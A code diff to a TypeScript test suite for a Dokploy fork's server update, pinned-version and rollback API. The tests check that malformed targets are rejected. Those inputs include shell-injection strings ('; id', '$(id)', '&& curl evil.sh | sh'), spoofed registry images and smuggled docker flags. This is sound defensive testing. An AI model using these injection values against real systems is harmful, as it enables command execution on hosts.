@@ -56,7 +56,7 @@ const DIGEST = `sha256:${"ab12".repeat(16)}`;
 let jobs: Promise<unknown>[] = [];
 let failures: unknown[] = [];
 
-// The docker argv of every spawn the background job ran.
+// The docker argv of every spawn, once the background jobs have settled.
 const spawned = async () => {
 	await Promise.all(jobs);
 	return mocks.spawnAsync.mock.calls.map(([command, args]) => [
@@ -75,6 +75,15 @@ const serviceUpdate = (image: string) => [
 	"dokploy",
 ];
 
+const manifestInspect = (image: string) => [
+	"docker",
+	"manifest",
+	"inspect",
+	image,
+];
+
+const recordedPoint = { version: "v0.30.8-community.31", digest: DIGEST };
+
 beforeEach(() => {
 	vi.clearAllMocks();
 	state.isCloud = false;
@@ -92,7 +101,9 @@ beforeEach(() => {
 			return run;
 		},
 	);
+	mocks.spawnAsync.mockReset();
 	mocks.spawnAsync.mockResolvedValue(Buffer.from(""));
+	mocks.recordDokployRollbackPoint.mockReset();
 	mocks.recordDokployRollbackPoint.mockResolvedValue(undefined);
 	mocks.readDokployRollbackPoint.mockResolvedValue(null);
 	mocks.getUpdateData.mockResolvedValue({
@@ -127,10 +138,22 @@ describe("settings.updateServer without a target", () => {
 
 		expect(mocks.recordDokployRollbackPoint).toHaveBeenCalledWith(
 			packageInfo.version,
+			{ installing: undefined },
 		);
 		expect(
 			mocks.recordDokployRollbackPoint.mock.invocationCallOrder[0],
 		).toBeLessThan(mocks.spawnAsync.mock.invocationCallOrder[0]!);
+	});
+
+	it("still runs the exact update when recording rejects", async () => {
+		mocks.recordDokployRollbackPoint.mockRejectedValue(new Error("boom"));
+
+		await caller.updateServer();
+
+		expect(await spawned()).toEqual([
+			serviceUpdate(`${REPO}:v0.30.9-community.1`),
+		]);
+		expect(failures).toEqual([]);
 	});
 
 	it("does nothing when no update is available", async () => {
@@ -143,36 +166,56 @@ describe("settings.updateServer without a target", () => {
 
 		expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
 		expect(mocks.recordDokployRollbackPoint).not.toHaveBeenCalled();
+		expect(mocks.spawnAsync).not.toHaveBeenCalled();
 		expect(mocks.audit).not.toHaveBeenCalled();
 	});
 
-	it("treats an empty input like no input", async () => {
-		await caller.updateServer({});
+	it.each([[{}], [{ rollback: false }]])(
+		"treats %j like no input",
+		async (input) => {
+			await caller.updateServer(input);
 
-		expect(await spawned()).toEqual([
-			serviceUpdate(`${REPO}:v0.30.9-community.1`),
-		]);
-	});
+			expect(mocks.readDokployRollbackPoint).not.toHaveBeenCalled();
+			expect(await spawned()).toEqual([
+				serviceUpdate(`${REPO}:v0.30.9-community.1`),
+			]);
+		},
+	);
 });
 
 describe("settings.updateServer with a pinned target", () => {
 	it.each([
-		["v0.30.8-community.32.1", `${REPO}:v0.30.8-community.32.1`],
-		["v0.30.8", `${REPO}:v0.30.8`],
-		[DIGEST, `${REPO}@${DIGEST}`],
-	])("%s pulls and installs %s from the fork repo", async (target, image) => {
+		[
+			"v0.30.8-community.32.1",
+			`${REPO}:v0.30.8-community.32.1`,
+			{ tag: "v0.30.8-community.32.1" },
+		],
+		[
+			`v0.30.8-community.32@${DIGEST}`,
+			`${REPO}:v0.30.8-community.32@${DIGEST}`,
+			{ tag: "v0.30.8-community.32", digest: DIGEST },
+		],
+	])("%s checks, pulls and installs %s", async (target, image, installing) => {
 		await expect(caller.updateServer({ target })).resolves.toBe(true);
 
 		expect(mocks.getUpdateData).not.toHaveBeenCalled();
+		expect(mocks.spawnAsync.mock.calls[0]).toEqual([
+			"docker",
+			["manifest", "inspect", image],
+			undefined,
+			{ timeout: 60_000 },
+		]);
 		expect(await spawned()).toEqual([
+			manifestInspect(image),
 			["docker", "pull", image],
 			serviceUpdate(image),
 		]);
 		// Recorded after the pull, before the service update.
 		expect(mocks.recordDokployRollbackPoint).toHaveBeenCalledWith(
 			packageInfo.version,
+			{ installing },
 		);
-		const [pull, update] = mocks.spawnAsync.mock.invocationCallOrder;
+		const [, pull, update] = mocks.spawnAsync.mock.invocationCallOrder;
 		const [record] = mocks.recordDokployRollbackPoint.mock.invocationCallOrder;
 		expect(pull).toBeLessThan(record!);
 		expect(record).toBeLessThan(update!);
@@ -184,49 +227,112 @@ describe("settings.updateServer with a pinned target", () => {
 		});
 	});
 
-	it("installs an older release too (a downgrade is a pin)", async () => {
-		mocks.getUpdateData.mockResolvedValue({
-			latestVersion: packageInfo.version,
-			updateAvailable: false,
+	it("refuses an image the registry doesn't have, before queueing anything", async () => {
+		mocks.spawnAsync.mockRejectedValueOnce(new Error("manifest unknown"));
+
+		await expect(
+			caller.updateServer({ target: "v9.9.9-community.1" }),
+		).rejects.toMatchObject({
+			code: "BAD_REQUEST",
+			message: `Image not found in ${REPO}.`,
 		});
-
-		await caller.updateServer({ target: "v0.30.8-community.31" });
-
-		expect(await spawned()).toContainEqual(
-			serviceUpdate(`${REPO}:v0.30.8-community.31`),
-		);
+		expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
+		expect(mocks.recordDokployRollbackPoint).not.toHaveBeenCalled();
+		expect(mocks.audit).not.toHaveBeenCalled();
 	});
 
 	it("keeps the service and the rollback point when the pull fails", async () => {
-		mocks.spawnAsync.mockRejectedValueOnce(new Error("manifest unknown"));
+		mocks.spawnAsync
+			.mockResolvedValueOnce(Buffer.from("{}"))
+			.mockRejectedValueOnce(new Error("pull failed"));
 
-		await caller.updateServer({ target: "v9.9.9" });
+		await caller.updateServer({ target: "v0.30.8-community.32.1" });
 
-		await Promise.all(jobs);
-		expect(failures).toEqual([new Error("manifest unknown")]);
-		expect(mocks.spawnAsync).toHaveBeenCalledOnce();
-		expect(mocks.spawnAsync.mock.calls[0]![1]).toEqual([
-			"pull",
-			`${REPO}:v9.9.9`,
+		expect(await spawned()).toEqual([
+			manifestInspect(`${REPO}:v0.30.8-community.32.1`),
+			["docker", "pull", `${REPO}:v0.30.8-community.32.1`],
 		]);
+		expect(failures).toEqual([new Error("pull failed")]);
 		expect(mocks.recordDokployRollbackPoint).not.toHaveBeenCalled();
+	});
+
+	it.each([
+		"v0.30.8-community.1",
+		"v0.30.8-community.1.1",
+		"v0.30.9",
+		"v0.31.0-community.1",
+		"v1.0.0",
+	])("accepts %s, at or above the floor", async (target) => {
+		await expect(caller.updateServer({ target })).resolves.toBe(true);
+		expect(await spawned()).toContainEqual(serviceUpdate(`${REPO}:${target}`));
+	});
+
+	it.each([
+		"v0.30.8",
+		"v0.30.7-community.40",
+		"v0.29.12-community.1",
+		"v0.29.11-community.1",
+		"v0.29.8",
+		`v0.29.12-community.1@${DIGEST}`,
+		`v0.30.8@${DIGEST}`,
+	])("refuses %s, below the floor v0.30.8-community.1", async (target) => {
+		await expect(caller.updateServer({ target })).rejects.toMatchObject({
+			code: "BAD_REQUEST",
+			message: expect.stringContaining("v0.30.8-community.1"),
+		});
+		expect(mocks.spawnAsync).not.toHaveBeenCalled();
+		expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
+	});
+
+	it("accepts a bare digest only when it is the recorded rollback", async () => {
+		mocks.readDokployRollbackPoint.mockResolvedValue(recordedPoint);
+
+		await caller.updateServer({ target: DIGEST });
+
+		expect(await spawned()).toEqual([
+			manifestInspect(`${REPO}@${DIGEST}`),
+			["docker", "pull", `${REPO}@${DIGEST}`],
+			serviceUpdate(`${REPO}@${DIGEST}`),
+		]);
+	});
+
+	it.each([
+		["no record", null],
+		[
+			"another recorded digest",
+			{ ...recordedPoint, digest: `sha256:${"f".repeat(64)}` },
+		],
+	])("refuses a bare digest with %s", async (_name, point) => {
+		mocks.readDokployRollbackPoint.mockResolvedValue(point);
+
+		await expect(caller.updateServer({ target: DIGEST })).rejects.toMatchObject(
+			{ code: "BAD_REQUEST", message: expect.stringContaining("@sha256") },
+		);
+		expect(mocks.spawnAsync).not.toHaveBeenCalled();
+		expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
 	});
 
 	it.each([
 		"latest",
 		"canary",
-		"v0.30.8 ",
-		" v0.30.8",
-		"v0.30.8\n",
-		"v0.30.8;id",
-		"v0.30.8 && curl evil.sh | sh",
+		"v0.30.8-community.32 ",
+		" v0.30.8-community.32",
+		"v0.30.8-community.32\n",
+		"v0.30.8-community.32\r",
+		"v0.30.8-community.32\u0000",
+		"v0.30.8-community.32 ",
+		"v0.30.8-community.32;id",
+		"v0.30.8-community.32 && curl evil.sh | sh",
 		"$(id)",
 		"`id`",
-		"ghcr.io/evil/dokploy-community:v0.30.8",
-		"dokploy/dokploy:v0.30.8",
-		`${REPO}:v0.30.8`,
+		"ghcr.io/evil/dokploy-community:v0.30.8-community.32",
+		"dokploy/dokploy:v0.30.8-community.32",
+		`${REPO}:v0.30.8-community.32`,
 		`${REPO}@${DIGEST}`,
 		`evil.io/x@${DIGEST}`,
+		`v0.30.8-community.32@${DIGEST} --detach`,
+		`v0.30.8-community.32@@${DIGEST}`,
+		`v0.30.8-community.32@sha256:${"A".repeat(64)}`,
 		`${DIGEST} --detach`,
 		"--help",
 		"",
@@ -243,7 +349,7 @@ describe("settings.updateServer with a pinned target", () => {
 
 	it("rejects a target together with rollback", async () => {
 		await expect(
-			caller.updateServer({ target: "v0.30.8", rollback: true }),
+			caller.updateServer({ target: "v0.30.8-community.32", rollback: true }),
 		).rejects.toMatchObject({ code: "BAD_REQUEST" });
 		expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
 	});
@@ -251,10 +357,7 @@ describe("settings.updateServer with a pinned target", () => {
 
 describe("settings.updateServer rollback", () => {
 	it("installs the recorded digest through the pinned path", async () => {
-		mocks.readDokployRollbackPoint.mockResolvedValue({
-			version: "v0.30.8-community.31",
-			digest: DIGEST,
-		});
+		mocks.readDokployRollbackPoint.mockResolvedValue(recordedPoint);
 
 		await expect(caller.updateServer({ rollback: true })).resolves.toBe(true);
 
@@ -263,9 +366,14 @@ describe("settings.updateServer rollback", () => {
 		);
 		expect(mocks.getUpdateData).not.toHaveBeenCalled();
 		expect(await spawned()).toEqual([
+			manifestInspect(`${REPO}@${DIGEST}`),
 			["docker", "pull", `${REPO}@${DIGEST}`],
 			serviceUpdate(`${REPO}@${DIGEST}`),
 		]);
+		expect(mocks.recordDokployRollbackPoint).toHaveBeenCalledWith(
+			packageInfo.version,
+			{ installing: { digest: DIGEST } },
+		);
 		expect(mocks.audit.mock.calls[0]![1]).toMatchObject({
 			resourceName: "dokploy-version",
 			metadata: { target: DIGEST, rollback: true },
@@ -274,13 +382,14 @@ describe("settings.updateServer rollback", () => {
 
 	it("re-validates the recorded digest", async () => {
 		mocks.readDokployRollbackPoint.mockResolvedValue({
-			version: "v0.30.8-community.31",
+			...recordedPoint,
 			digest: `${DIGEST}; id`,
 		});
 
 		await expect(caller.updateServer({ rollback: true })).rejects.toMatchObject(
 			{ code: "BAD_REQUEST" },
 		);
+		expect(mocks.spawnAsync).not.toHaveBeenCalled();
 		expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
 	});
 
@@ -288,6 +397,7 @@ describe("settings.updateServer rollback", () => {
 		await expect(caller.updateServer({ rollback: true })).rejects.toMatchObject(
 			{ code: "BAD_REQUEST", message: expect.stringContaining("roll back") },
 		);
+		expect(mocks.spawnAsync).not.toHaveBeenCalled();
 		expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
 		expect(mocks.audit).not.toHaveBeenCalled();
 	});
@@ -295,10 +405,9 @@ describe("settings.updateServer rollback", () => {
 
 describe("settings.getUpdateRollback", () => {
 	it("offers the recorded previous version", async () => {
-		const point = { version: "v0.30.8-community.31", digest: DIGEST };
-		mocks.readDokployRollbackPoint.mockResolvedValue(point);
+		mocks.readDokployRollbackPoint.mockResolvedValue(recordedPoint);
 
-		await expect(caller.getUpdateRollback()).resolves.toEqual(point);
+		await expect(caller.getUpdateRollback()).resolves.toEqual(recordedPoint);
 		expect(mocks.readDokployRollbackPoint).toHaveBeenCalledWith(
 			packageInfo.version,
 		);
@@ -314,34 +423,33 @@ describe("permission and cloud guards", () => {
 		["update", () => callerAs("member").updateServer()],
 		[
 			"pinned update",
-			() => callerAs("member").updateServer({ target: "v0.30.8" }),
+			() => callerAs("member").updateServer({ target: "v0.30.8-community.32" }),
 		],
 		["rollback", () => callerAs("member").updateServer({ rollback: true })],
 		["rollback lookup", () => callerAs("member").getUpdateRollback()],
 	])("a member can't run the %s", async (_name, run) => {
 		await expect(run()).rejects.toMatchObject({ code: "UNAUTHORIZED" });
+		expect(mocks.spawnAsync).not.toHaveBeenCalled();
 		expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
 		expect(mocks.readDokployRollbackPoint).not.toHaveBeenCalled();
 	});
 
 	it("an admin can run a pinned update", async () => {
 		await expect(
-			callerAs("admin").updateServer({ target: "v0.30.8" }),
+			callerAs("admin").updateServer({ target: "v0.30.8-community.32" }),
 		).resolves.toBe(true);
 	});
 
 	it("does nothing on cloud", async () => {
 		state.isCloud = true;
-		mocks.readDokployRollbackPoint.mockResolvedValue({
-			version: "v0.30.8-community.31",
-			digest: DIGEST,
-		});
+		mocks.readDokployRollbackPoint.mockResolvedValue(recordedPoint);
 
-		await expect(caller.updateServer({ target: "v0.30.8" })).resolves.toBe(
-			true,
-		);
+		await expect(
+			caller.updateServer({ target: "v0.30.8-community.32" }),
+		).resolves.toBe(true);
 		await expect(caller.updateServer({ rollback: true })).resolves.toBe(true);
 		await expect(caller.getUpdateRollback()).resolves.toBeNull();
+		expect(mocks.spawnAsync).not.toHaveBeenCalled();
 		expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
 		expect(mocks.recordDokployRollbackPoint).not.toHaveBeenCalled();
 		expect(mocks.readDokployRollbackPoint).not.toHaveBeenCalled();
